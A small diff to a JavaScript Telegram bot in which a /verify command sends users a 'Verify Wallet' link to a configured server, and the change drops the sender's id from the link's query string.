@@ -6,7 +6,7 @@ const SERVER_URL = "10.0.0.39"; // e.g., http://yourserver.com
 
 bot.onText(/\/verify/, async (msg) => {
     const chatId = msg.chat.id;
-    const verifyUrl = `${SERVER_URL}?chatId=${chatId}&from=${msg.from.id}`;
+    const verifyUrl = `${SERVER_URL}?chatId=${chatId}`;
 
     bot.sendMessage(chatId, `Click the link below to verify your wallet:\n[Verify Wallet](${verifyUrl})`, { parse_mode: 'Markdown' });
 });
